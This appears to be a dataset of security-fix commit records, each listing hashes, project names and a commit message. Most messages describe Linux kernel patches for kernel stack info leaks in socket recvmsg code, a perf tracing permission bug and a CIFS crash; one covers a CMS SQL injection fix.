    78e27e3b52ac2ee0b9e86f544b77a45e12865d95
Blob(s) Before Fix: 
    19a359d5e6d58573cc1c74326e488a419b01b342
    80c36bcf66e8e8d089776ff14b780f3f85efa418
    8354dc81ae6407c970a10a2bb40523085bc56e0a
    84b1e045faba836583fb371d285f49e79bfa6bd0
    fee3752ae8f66f5348199c67b6ad05c5a41346f5
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 12ae030d54ef250706da5642fc7697cc60ad0df7:
perf/ftrace: Fix paranoid level for enabling function tracer\n\nThe current default perf paranoid level is "1" which has "perf_paranoid_kernel()" return false, and giving any operations that use it, access to normal users. Unfortunately, this includes function tracing and normal users should not be allowed to enable function tracing by default.\n\nThe proper level is defined at "-1" (full perf access), which "perf_paranoid_tracepoint_raw()" will only give access to. Use that check instead for enabling function tracing.\n\nReported-by: Dave Jones <davej@redhat.com> Reported-by: Vince Weaver <vincent.weaver@maine.edu> Tested-by: Vince Weaver <vincent.weaver@maine.edu> Cc: Peter Zijlstra <peterz@infradead.org> Cc: Ingo Molnar <mingo@kernel.org> Cc: Jiri Olsa <jolsa@redhat.com> Cc: Frederic Weisbecker <fweisbec@gmail.com> Cc: stable@vger.kernel.org # 3.4+ CVE: CVE-2013-2930 Fixes: ced39002f5ea ("ftrace, perf: Add support to use function tracepoint in perf") Signed-off-by: Steven Rostedt <rostedt@goodmis.org>

======================================================================
Commit With Fix: 
    972757c4500d94b4b1306bf092e678add3a987d8
File(s) In Commit: 
    plugins/jojo_core/classes/Jojo.php
Blob(s) In Commit: 
    c47c5dbe8388167bf98f03484a4b945ca6ea7f3a
Blob(s) Before Fix: 
    c61e1aff85bc853d0788c7c6cb8708564fd480a6
Projects:
    tekapa_Jojo-CMS
Commit Message for 972757c4500d94b4b1306bf092e678add3a987d8:
Fix SQL injection issue CVE-2013-3081

======================================================================
Commit With Fix: 
    9b3e617f3df53822345a8573b6d358f6b9e5ed87
File(s) In Commit: 
    net/atm/common.c
Blob(s) In Commit: 
    737bef59ce899adc0a3e0ba67ea3d56536e5b7e5
Blob(s) Before Fix: 
    0c0ad930a632f23e4c0661a20684c5d572e3dc15
    14ff9fe399896c024630c3bced79de195cd5dd54
    22b963d06a10bb19b5eaea32886a8c7ee15b371a
    43b6bfed036ca71b698b286b5b36a7e982717d47
    4b263b82d23f0d845911d4efe223b6e001a3827b
    5b174df3338c855c5d1a5be74716630bc83a7cd6
    7b491006eaf4000424282979b0c4709325102152
    806fc0a400514b677ca1d74abf1c55a055097822
    b4b44dbed645f74046ae4663a31b805a0ed72b52
    cf4b7e667a6e497a0d5d748eed8c8ccabc9bd667
    f0a9b7eb37327a622bc94e40f14984d0b6f0a465
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9b3e617f3df53822345a8573b6d358f6b9e5ed87:
atm: update msg_namelen in vcc_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about vcc_recvmsg() not filling the msg_name in case it was set.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ef3313e84acbf349caecae942ab3ab731471f1a1
File(s) In Commit: 
    net/ax25/af_ax25.c
Blob(s) In Commit: 
    e277e38f736b93a133a6cd43cc7b264acfbad641
Blob(s) Before Fix: 
    188903184763eb71fe2f008f49c1698ac6c139f4
    3cd0a0dc91cb6b3823271ccd109ab021dc5abef1
    68b39927ecda745dd4599329650f28f3d717db45
    69940a723abd347ddfbe02f0f99dee2ba5a23554
    69a06c47b648ddc0eb11e6e10c8db93abcea3169
    779095ded689918de025f48c47db880aa9b5d724
    7b11f8bc5071cba0de51054913fa5f3e8bb3f063
    86ac37f8e2272a5028906621cf61d136db6b8c5b
    9d9a6a3edbd58584fdceffdf680de6e28dc72c90
    b04a6ef4da94875ee86a0aacdce0f082c583a4b5
    ba6db78a02b162cc576ca6cc310ab8f7ffd4ffb3
    c35c3f48fc0ff6e130d940b3d8b24b208250a738
    d53a123e36a04e13d7560941c8a6016637de60d6
    e7c69f4619ec0f7f90d41d9fbbe7f0caa2b7d52f
    eb373274e34238e2a149a96b802123e55b77750e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ef3313e84acbf349caecae942ab3ab731471f1a1:
ax25: fix info leak via msg_name in ax25_recvmsg()\n\nWhen msg_namelen is non-zero the sockaddr info gets filled out, as requested, but the code fails to initialize the padding bytes of struct sockaddr_ax25 inserted by the compiler for alignment. Additionally the msg_namelen value is updated to sizeof(struct full_sockaddr_ax25) but is not always filled up to this size.\n\nBoth issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.\n\nFix both issues by initializing the memory with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4683f42fde3977bdb4e8a09622788cc8b5313778
File(s) In Commit: 
    net/bluetooth/af_bluetooth.c
Blob(s) In Commit: 
    0d1b08cc76e1d73acba966e4c22f64c0285cce05
Blob(s) Before Fix: 
    3e18af4dadc442573960b94abefed550212b9b47
    5355df63d39b673d246d131564a1e17dc116c27d
    b04795e7aec599dfb8d527f738fde26b9d6b2e14
    ba033f09196ee45d7d6fbd170386a0d62af1d4ac
    cdcfcabb34ab8daf5b2275f52084c055926dac73
    d3ee69b35a78267f35b8ea4a9b32d367160eea21
    f7db5792ec648d3078d047cb46d0b269a68028bf
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4683f42fde3977bdb4e8a09622788cc8b5313778:
Bluetooth: fix possible info leak in bt_sock_recvmsg()\n\nIn case the socket is already shutting down, bt_sock_recvmsg() returns with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix this by moving the msg_namelen assignment in front of the shutdown test.\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    e11e0455c0d7d3d62276a0c55d9dfbc16779d691
File(s) In Commit: 
    net/bluetooth/rfcomm/sock.c
Blob(s) In Commit: 
    7c9224bcce178c493ce0a19f3f8250b1828d39b8
Blob(s) Before Fix: 
    1a17850d093cd652621ac54833c53b8dabd395bc
    868a909272bc25d73a31f256b2095b9463457096
    970fc13d8e399e271a0228dec0be9c457a6d6336
    aea2bdd1510f2b4f083a4581105228b927cde858
    b3226f3658cfda1142c7484b110324115dccc85b
    c23bae86263b6e98a21a8f69ae45190b827b2376
    ce3f6658f4b284f627325021d59920262f8a7afc
    e8707debb8642cff6cc08755a6400134bcf5b8c7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for e11e0455c0d7d3d62276a0c55d9dfbc16779d691:
Bluetooth: RFCOMM - Fix missing msg_namelen update in rfcomm_sock_recvmsg()\n\nIf RFCOMM_DEFER_SETUP is set in the flags, rfcomm_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_stream_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c8c499175f7d295ef867335bceb9a76a2c3cdc38
File(s) In Commit: 
    net/bluetooth/sco.c
Blob(s) In Commit: 
    fb6192c9812e81bcac3d8dea31f60095aa40ffda
Blob(s) Before Fix: 
    3589e21edb09817bace527336fd4880e24137ada
    531a93d613d4f3f86eff5174cdbb1236b75cfb53
    57f250c20e399851ca6998d9813dc60e3ffa3455
    5dc2f2126fac669a2f1b961efb8ce665768da2f2
    79d87d8d4f514f5529b57f1b89119a735d068f69
    aaf1957bc4fea023e0be0d66fb96e64e359dfc54
    b5178d62064ec86bcf3f469528ff80ac9668e126
    caa109df645292a0a59e78be01e39a64ce8f90c5
    cbdd313659a78f3bf9133d10ee01e487fd2d9053
    cc16d1bccf54ae66ff448f275882454b3f66df42
    dc42b917aaafad3f050177694c438648af2b22bb
    fad0302bdb325e5df700edf4fe323c6226216599
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c8c499175f7d295ef867335bceb9a76a2c3cdc38:
Bluetooth: SCO - Fix missing msg_namelen update in sco_sock_recvmsg()\n\nIf the socket is in state BT_CONNECT2 and BT_SK_DEFER_SETUP is set in the flags, sco_sock_recvmsg() returns early with 0 without updating the possibly set msg_namelen member. This, in turn, leads to a 128 byte kernel stack leak in net/socket.c.\n\nFix this by updating msg_namelen in this case. For all other cases it will be handled in bt_sock_recvmsg().\n\nCc: Marcel Holtmann <marcel@holtmann.org> Cc: Gustavo Padovan <gustavo@padovan.org> Cc: Johan Hedberg <johan.hedberg@gmail.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    2d6fbfe733f35c6b355c216644e08e149c61b271
File(s) In Commit: 
    net/caif/caif_socket.c
Blob(s) In Commit: 
    ff2ff3ce6965a73dcf74918cd5c5bcc1b4a7d51b
Blob(s) Before Fix: 
    095259f839023a99a2127d1d4173bb29737471df
    53a8e37d020a3f1cbe28b4de9f5ce006380d8f50
    78f1cdad5b332b91401570aeccbc12af5bd33d1e
    a986280864523d431e8f30f96af1a346abe2b784
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 2d6fbfe733f35c6b355c216644e08e149c61b271:
caif: Fix missing msg_namelen update in caif_seqpkt_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about caif_seqpkt_recvmsg() not filling the msg_name in case it was set.\n\nCc: Sjur Braendeland <sjur.brandeland@stericsson.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    5ae94c0d2f0bed41d6718be743985d61b7f5c47d
File(s) In Commit: 
    net/irda/af_irda.c
Blob(s) In Commit: 
    e493b3397ae3337b4582d811febb932e0711a09e
Blob(s) Before Fix: 
    3c9bd5949d7afbdc0238e2d49d0c696655d126a6
    4d04105a3f06b8ac65e55e4e9a44b39026736619
    b833677d83d6293724ba2d9948b37c9dbf472694
    bb14c34776801e7dd43ce13c8552794d89a5c197
    bb738c9f91461df7fb3d718a1ed6b771dae33f1a
    d07e3a626446b3cab44e68b019f7870619699f75
    d28e7f014cc639779a4557203b4b2ba2f7e63927
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 5ae94c0d2f0bed41d6718be743985d61b7f5c47d:
irda: Fix missing msg_namelen update in irda_recvmsg_dgram()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about irda_recvmsg_dgram() not filling the msg_name in case it was set.\n\nCc: Samuel Ortiz <samuel@sortiz.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    a5598bd9c087dc0efc250a5221e5d0e6f584ee88
File(s) In Commit: 
    net/iucv/af_iucv.c
Blob(s) In Commit: 
    bf69358200019c28c18472cc852ccd6b3f74f7cf
Blob(s) Before Fix: 
    625bc50391ccf7aa75fb4f424ec18cf800b7dd93
    a7d11ffe428428f25194702c5728562fd87a8e2b
    cd6f7a991d8035bdfc6d883a8bcf21a433405030
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for a5598bd9c087dc0efc250a5221e5d0e6f584ee88:
iucv: Fix missing msg_namelen update in iucv_sock_recvmsg()\n\nThe current code does not fill the msg_name member in case it is set. It also does not set the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix that by simply setting msg_namelen to 0 as obviously nobody cared about iucv_sock_recvmsg() not filling the msg_name in case it was set.\n\nCc: Ursula Braun <ursula.braun@de.ibm.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    b860d3cc62877fad02863e2a08efff69a19382d2
File(s) In Commit: 
    net/l2tp/l2tp_ip6.c
Blob(s) In Commit: 
    b8a6039314e868781d3130f06fbb78ced6c4a678
Blob(s) Before Fix: 
    15367918413c7147255c803c70d677c3b1cdbeef
    35e1e4bde58730d8395e2870d552230bca3a9c3d
    388b4dcf22aa21cfe94df788cbf45689f3e4ba99
    3b61ddd6e4a67c0e61514213d95c9a6acbe1c123
    41f2f8126ebc720933638f67eb800f17797987e7
    7704ea9502fdc9e49a2b8bb7fda4b9b9ec8d1722
    8783dfe5ac6ca74c6d5ea6df5f96a1b7e37826a8
    8ee4a86ae996ca624e06a1422e4e07a2e957c584
    927547171bc7119f57a7b8afecf453ec5eeabf61
    9e1822e811367700d950f991ead479c841897b08
    c74f5a91ff6a3213209c23ff488f0b475a552857
    d9b437e5500795219339c85a8aab8a0301cc77b9
    e6e8408c9e3670b2303625e96a1154f34b07ef1b
    fb861f2d8803064eff5b62e7333bc76ed1111140
    fdbdb265b7ca12da5ffdab15ed983136be6411b1
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for b860d3cc62877fad02863e2a08efff69a19382d2:
l2tp: fix info leak in l2tp_ip6_recvmsg()\n\nThe L2TP code for IPv6 fails to initialize the l2tp_conn_id member of struct sockaddr_l2tpip6 and therefore leaks four bytes kernel stack in l2tp_ip6_recvmsg() in case msg_name is set.\n\nInitialize l2tp_conn_id with 0 to avoid the info leak.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    c77a4b9cffb6215a15196ec499490d116dfad181
File(s) In Commit: 
    net/llc/af_llc.c
Blob(s) In Commit: 
    48aaa89253e037c9b7f2e07f3bc1d03d837266fd
Blob(s) Before Fix: 
    0080d2b0a8ae5f317df6b7bee4fdec59d4dc37bf
    0252a68765475ef33f3e32fe94dea9c2d6bab048
    6b2e32ebbccf69e2845df66c6ede0d46fa943c6a
    6cba486353e8a33dcba394e89664f3886da205c2
    88709882c4641f7d147fbeaa9f48323cfc8637eb
    99a60d545b2488840afe25255366f48c45a9ba44
    9d140594082c655bcf2e4857deeff2b4de379693
    a18e6c3d36e37e699089ed5e0910c857da073d1c
    b9bef2c750267cfd0adeaf918c1cc5503461d3db
    c2190005a11410e2f95141fb841dadc051157a8b
    c3ee805470667389f8c8cfe8d7b633e929474d80
    df08d7779e1d7e842e63fb4687d668d28260ae68
    dfd3a648a55107bda2ff14adb6f9e91c06449240
    e3fd74f18b3cfc3f559faa63cb2bda30eb28e314
    e4d2fbb59a7eb80819a5cf1b9794985e6c0cd71e
    e5565c71cbbb5d9889c3f644ae1d00f8d1708287
    fe5453c3e71931476823da9d78d755d521487db0
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for c77a4b9cffb6215a15196ec499490d116dfad181:
llc: Fix missing msg_namelen update in llc_ui_recvmsg()\n\nFor stream sockets the code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory. The msg_namelen update is also missing for datagram sockets in case the socket is shutting down during receive.\n\nFix both issues by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.\n\nCc: Arnaldo Carvalho de Melo <acme@ghostprotocols.net> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    d26d6504f23e803824e8ebd14e52d4fc0a0b09cb
File(s) In Commit: 
    net/nfc/llcp/sock.c
Blob(s) In Commit: 
    6c94447ec414c87479581b45fbcced1071f782cb
Blob(s) Before Fix: 
    48fb1ded383a2b16e9643705f686403920cda6de
    5332751943a9ec564befadda63a5a3749d7434c1
    5c7cdf3f2a83b5a6a85033744121727ecddba70d
    63e4cdc92376eb20e0569c34a5c167d1332c4e78
    8f025746f3370b4296c8064c603e06085adcb42e
    ddeb9aa398f0ced280fed93b853319923cf43c69
    e06d458fc7197ff73e1f1f6f155c154c330cfa67
    f738ccd535f1c984f3a741ac32c43acc6bc3c7c5
    fea22eb41b8242a1fb80d22c6aa2ca6515d78d0e
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d26d6504f23e803824e8ebd14e52d4fc0a0b09cb:
NFC: llcp: fix info leaks via msg_name in llcp_sock_recvmsg()\n\nThe code in llcp_sock_recvmsg() does not initialize all the members of struct sockaddr_nfc_llcp when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment.\n\nAlso, if the socket is in state LLCP_CLOSED or is shutting down during receive the msg_namelen member is not updated to 0 while otherwise returning with 0, i.e. "success". The msg_namelen update is also missing for stream and seqpacket sockets which don't fill the sockaddr info.\n\nBoth issues lead to the fact that the code will leak uninitialized kernel stack bytes in net/socket.c.\n\nFix the first issue by initializing the memory used for sockaddr info with memset(0). Fix the second one by setting msg_namelen to 0 early. It will be updated later if we're going to fill the msg_name member.\n\nCc: Lauro Ramos Venancio <lauro.venancio@openbossa.org> Cc: Aloisio Almeida Jr <aloisio.almeida@openbossa.org> Cc: Samuel Ortiz <sameo@linux.intel.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    4a184233f21645cf0b719366210ed445d1024d72
File(s) In Commit: 
    net/rose/af_rose.c
Blob(s) In Commit: 
    9c834745159786e5e1d4338f51860be00943a0fd
Blob(s) Before Fix: 
    1f96fb9743b584590843214b5b582d8ebb6a26c9
    27e6896705e693e87b0b73c33cb70a2e163c528a
    7f645d115795e87dfd493527ee4814e23250d5d0
    abf0ad6311d08e06198620ea2cc543d85c389a5b
    ae29c139d1c205f9937fb1571ca2da4bebc85948
    b768fe9d5e7a76301b4bb4a44983237e8e554600
    bde7d69b440da9256e3b2d34e636a014c2ea288c
    c2cca2ee6aefc1f4b98db1334469dbcb4f095ad1
    c4719ce604c28040b1cfdc9bff0f3a9ee4d2200d
    cf68e6e4054a6735694b1ce5bbee30fefbb02899
    f9ea925ad9cb6c1628bf6f38a57c4f49c210b589
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4a184233f21645cf0b719366210ed445d1024d72:
rose: fix info leak via msg_name in rose_recvmsg()\n\nThe code in rose_recvmsg() does not initialize all of the members of struct sockaddr_rose/full_sockaddr_rose when filling the sockaddr info. Nor does it initialize the padding bytes of the structure inserted by the compiler for alignment. This will lead to leaking uninitialized kernel stack bytes in net/socket.c.\n\nFix the issue by initializing the memory used for sockaddr info with memset(0).\n\nCc: Ralf Baechle <ralf@linux-mips.org> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    60085c3d009b0df252547adb336d1ccca5ce52ec
File(s) In Commit: 
    net/tipc/socket.c
Blob(s) In Commit: 
    515ce38e4f4c7286023f32f4c8c692af2787ec80
Blob(s) Before Fix: 
    09dc5b97e07957d2ebb737cf402202efaf7c78ab
    0ed0eaa62f29e7148052907892ff90ebd20d2fed
    29e957f64458ec146070dc64634dda7fd333c3e7
    2b1d7c2d677d3f45bf6a547b8c777e5f2277f2a8
    338837396642d016c2001f30fca9ccb624d1d41d
    36107864bcc3370c2ce33249ead3f3eba1c2b2bc
    42b8324ff2eef6e27834c9ba1d9efd994dd3ba75
    5577a447f5311b7cb8e7972c6bc2ffa075ba9432
    64ade972bb8694ac5daede3e9cf5baa8a6d56ee7
    64b847008ee396cfec9a5bc4e223c4c611547e84
    7e26ad416af1aa786b6fa969260d794f1592ebb5
    9b4e4833a484f959a891d5022ff468c671f38239
    a9622b6cd91689ae17ae92b9226c3705067a1a8a
    d5b4e70252f0e8df6dff75e99bdf7415de66d316
    e0cb5edc6d1d9a62fc5262ae994c5c5eeb583f86
    e2f7c5d370ba622d8dd44ddb6fe68d3466330d2f
    fc906d9391b7b06949a5a7f624236a80fd27cf99
    fd5f042dbff4d8a8a47c2a532e0d0ac5d0a70cd2
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 60085c3d009b0df252547adb336d1ccca5ce52ec:
tipc: fix info leaks via msg_name in recv_msg/recv_stream\n\nThe code in set_orig_addr() does not initialize all of the members of struct sockaddr_tipc when filling the sockaddr info -- namely the union is only partly filled. This will make recv_msg() and recv_stream() -- the only users of this function -- leak kernel stack memory as the msg_name member is a local variable in net/socket.c.\n\nAdditionally to that both recv_msg() and recv_stream() fail to update the msg_namelen member to 0 while otherwise returning with 0, i.e. "success". This is the case for, e.g., non-blocking sockets. This will lead to a 128 byte kernel stack leak in net/socket.c.\n\nFix the first issue by initializing the memory of the union with memset(0). Fix the second one by setting msg_namelen to 0 early as it will be updated later if we're going to fill the msg_name member.\n\nCc: Jon Maloy <jon.maloy@ericsson.com> Cc: Allan Stephens <allan.stephens@windriver.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    680d04e0ba7e926233e3b9cee59125ce181f66ba
File(s) In Commit: 
    net/vmw_vsock/vmci_transport.c
Blob(s) In Commit: 
    5e04d3d96285daaa01ff8d35e58081ce4807f093
Blob(s) Before Fix: 
    1f6508e249ae5934ce9257ebe5cc3e5941300ffa
    a70ace83a1531232a2f11afc63c8b4ab1c4ea918
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 680d04e0ba7e926233e3b9cee59125ce181f66ba:
VSOCK: vmci - fix possible info leak in vmci_transport_dgram_dequeue()\n\nIn case we received no data on the call to skb_recv_datagram(), i.e. skb->data is NULL, vmci_transport_dgram_dequeue() will return with 0 without updating msg_namelen leading to net/socket.c leaking the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nFix this by moving the already existing msg_namelen assignment a few lines above.\n\nCc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    d5e0d0f607a7a029c6563a0470d88255c89a8d11
File(s) In Commit: 
    net/vmw_vsock/af_vsock.c
Blob(s) In Commit: 
    7f93e2a42d7a57f0cbdbe2305c942cce7b544d1b
Blob(s) Before Fix: 
    ca511c4f388a56cf1fdaf110d31aff7d30b5d0fb
    d8079daf1bdeaed0f341aaac673c8b9e1da7d96b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for d5e0d0f607a7a029c6563a0470d88255c89a8d11:
VSOCK: Fix missing msg_namelen update in vsock_stream_recvmsg()\n\nThe code misses to update the msg_namelen member to 0 and therefore makes net/socket.c leak the local, uninitialized sockaddr_storage variable to userland -- 128 bytes of kernel stack memory.\n\nCc: Andy King <acking@vmware.com> Cc: Dmitry Torokhov <dtor@vmware.com> Cc: George Zhang <georgezhang@vmware.com> Signed-off-by: Mathias Krause <minipli@googlemail.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ea702b80e0bbb2448e201472127288beb82ca2fe
File(s) In Commit: 
    fs/cifs/transport.c
Blob(s) In Commit: 
    1a528680ec5a29e4b59485fba5df54568a1e3787
Blob(s) Before Fix: 
    0961336513d5334d99084eee82addeb1b582ffbf
    0cc9584f5889f051208a00bb346869d73f6ed1ba
    3097ee58fd7d432548d64f205b75a08efa133405
    46d8756f2b241673878da87a8c1b905537c4c935
    5f468459a1e294fb9f2ba30b2141bc5bc26eaab0
    76d974c952fe93126a31d437dc0e362ffef6087c
    82f78c4d6978ceafdab5789182193b899a435202
    83867ef348dfe15276d83379f12ae5c46399f7a0
    99a27cfa6cd2cec5f43582ebb90d80ddae6fd962
    c1b9c4b107398bd31504f594f294c5bb6dc7ef60
    d9b639b95fa8b8a5167ecf58fa3285f90ff2520f
    f25d4ea14be4b7d751e69817eca9bad2d6a14935
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ea702b80e0bbb2448e201472127288beb82ca2fe:
cifs: move check for NULL socket into smb_send_rqst\n\nCai reported this oops:\n\n[90701.616664] BUG: unable to handle kernel NULL pointer dereference at 0000000000000028 [90701.625438] IP: [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.632167] PGD fea319067 PUD 103fda4067 PMD 0 [90701.637255] Oops: 0000 [#1] SMP [90701.640878] Modules linked in: des_generic md4 nls_utf8 cifs dns_resolver binfmt_misc tun sg igb iTCO_wdt iTCO_vendor_support lpc_ich pcspkr i2c_i801 i2c_core i7core_edac edac_core ioatdma dca mfd_core coretemp kvm_intel kvm crc32c_intel microcode sr_mod cdrom ata_generic sd_mod pata_acpi crc_t10dif ata_piix libata megaraid_sas dm_mirror dm_region_hash dm_log dm_mod [90701.677655] CPU 10 [90701.679808] Pid: 9627, comm: ls Tainted: G        W    3.7.1+ #10 QCI QSSC-S4R/QSSC-S4R [90701.688950] RIP: 0010:[<ffffffff814a343e>]  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.698383] RSP: 0018:ffff88177b431bb8  EFLAGS: 00010206 [90701.704309] RAX: ffff88177b431fd8 RBX: 00007ffffffff000 RCX: ffff88177b431bec [90701.712271] RDX: 0000000000000003 RSI: 0000000000000006 RDI: 0000000000000000 [90701.720223] RBP: ffff88177b431bc8 R08: 0000000000000004 R09: 0000000000000000 [90701.728185] R10: 0000000000000001 R11: 0000000000000000 R12: 0000000000000001 [90701.736147] R13: ffff88184ef92000 R14: 0000000000000023 R15: ffff88177b431c88 [90701.744109] FS:  00007fd56a1a47c0(0000) GS:ffff88105fc40000(0000) knlGS:0000000000000000 [90701.753137] CS:  0010 DS: 0000 ES: 0000 CR0: 000000008005003b [90701.759550] CR2: 0000000000000028 CR3: 000000104f15f000 CR4: 00000000000007e0 [90701.767512] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000 [90701.775465] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400 [90701.783428] Process ls (pid: 9627, threadinfo ffff88177b430000, task ffff88185ca4cb60) [90701.792261] Stack: [90701.794505]  0000000000000023 ffff88177b431c50 ffff88177b431c38 ffffffffa014fcb1 [90701.802809]  ffff88184ef921bc 0000000000000000 00000001ffffffff ffff88184ef921c0 [90701.811123]  ffff88177b431c08 ffffffff815ca3d9 ffff88177b431c18 ffff880857758000 [90701.819433] Call Trace: [90701.822183]  [<ffffffffa014fcb1>] smb_send_rqst+0x71/0x1f0 [cifs] [90701.828991]  [<ffffffff815ca3d9>] ? schedule+0x29/0x70 [90701.834736]  [<ffffffffa014fe6d>] smb_sendv+0x3d/0x40 [cifs] [90701.841062]  [<ffffffffa014fe96>] smb_send+0x26/0x30 [cifs] [90701.847291]  [<ffffffffa015801f>] send_nt_cancel+0x6f/0xd0 [cifs] [90701.854102]  [<ffffffffa015075e>] SendReceive+0x18e/0x360 [cifs] [90701.860814]  [<ffffffffa0134a78>] CIFSFindFirst+0x1a8/0x3f0 [cifs] [90701.867724]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.875601]  [<ffffffffa013f731>] ? build_path_from_dentry+0xf1/0x260 [cifs] [90701.883477]  [<ffffffffa01578e6>] cifs_query_dir_first+0x26/0x30 [cifs] [90701.890869]  [<ffffffffa015480d>] initiate_cifs_search+0xed/0x250 [cifs] [90701.898354]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.904486]  [<ffffffffa01554cb>] cifs_readdir+0x45b/0x8f0 [cifs] [90701.911288]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.917410]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.923533]  [<ffffffff81195970>] ? fillonedir+0x100/0x100 [90701.929657]  [<ffffffff81195848>] vfs_readdir+0xb8/0xe0 [90701.935490]  [<ffffffff81195b9f>] sys_getdents+0x8f/0x110 [90701.941521]  [<ffffffff815d3b99>] system_call_fastpath+0x16/0x1b [90701.948222] Code: 66 90 55 65 48 8b 04 25 f0 c6 00 00 48 89 e5 53 48 83 ec 08 83 fe 01 48 8b 98 48 e0 ff ff 48 c7 80 48 e0 ff ff ff ff ff ff 74 22 <48> 8b 47 28 ff 50 68 65 48 8b 14 25 f0 c6 00 00 48 89 9a 48 e0 [90701.970313] RIP  [<ffffffff814a343e>] kernel_setsockopt+0x2e/0x60 [90701.977125]  RSP <ffff88177b431bb8> [90701.981018] CR2: 0000000000000028 [90701.984809] ---[ end trace 24bd602971110a43 ]---\n\nThis is likely due to a race vs. a reconnection event.\n\nThe current code checks for a NULL socket in smb_send_kvec, but that's too late. By the time that check is done, the 